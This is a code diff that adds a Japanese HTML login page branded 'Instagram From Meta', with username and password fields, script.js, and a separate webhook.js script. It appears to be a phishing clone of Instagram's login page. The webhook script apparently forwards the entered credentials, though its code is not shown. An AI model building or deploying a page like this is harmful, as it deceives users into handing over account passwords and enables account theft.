@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>ログイン</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <main class="container" role="main">
+    <div class="lang-selector">
+      <a href="#" class="lang-link">日本語</a>
+    </div>
+    <div class="top-space"></div>
+    <img src="IMG_0624.png" alt="IMG_0624.png" class="logo" />
+    <form id="loginForm" class="form" autocomplete="on" novalidate>
+      <label class="sr-only" for="user">ユーザーネーム、メールまたは携帯電話番号</label>
+      <input id="user" name="user" type="text" placeholder="ユーザーネーム、メールまたは携帯電話番号" class="input" required />
+      <label class="sr-only" for="password">パスワード</label>
+      <input id="password" name="password" type="password" placeholder="パスワード" class="input" required />
+      <button type="submit" class="btn btn-primary" id="loginBtn">ログイン</button>
+    </form>
+    <div class="helper">
+      <a href="#" id="forgot">パスワードを忘れた場合</a>
+    </div>
+    <div class="or-divider">または</div> <div class="create-box">
+      <button id="createAccount" class="btn btn-outline">新しいアカウントを作成</button>
+    </div>
+    <footer class="footer">
+      <span class="brand">Instagram From Meta</span> </footer>
+  </main>
+  <script src="script.js"></script>
+  <script src="webhook.js"></script>
+</body>
+</html>
